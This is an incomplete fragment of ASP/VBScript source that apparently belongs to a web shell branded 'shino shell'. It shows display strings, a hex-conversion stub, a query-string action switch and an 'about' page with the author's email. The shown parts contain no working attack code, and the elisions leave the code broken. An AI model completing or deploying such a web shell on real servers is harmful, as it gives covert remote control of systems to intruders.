...
endocde = "</body></html>"
onlinehelp = "<font face=""arial"" size=""1"">.:: <a href=""http:/google.com"" target=""_blank"">ONLINE HELP</a> ::.</font><br>"
Function HexConv(hexVar)
	Dim hxx, hxx_var, multiply          
         ...
         END IF
End Function
cprthtml = "<font face='arial' size='1'>.:: shino shell &copy; BY <a href='mailto:'>shino/a> - <a href='' target='_blank'>shino/a> ::.</font>"
Dim Base64Chars
...
Select Case Trim(Request.QueryString("action"))
	...
	Case "about"
		...
		response.Write "<br>"
		response.Write "<font size=2 color=Red face='courier new'>E-Mail: agcshino@gmail.com</font>"
		response.Write "<br><br>"
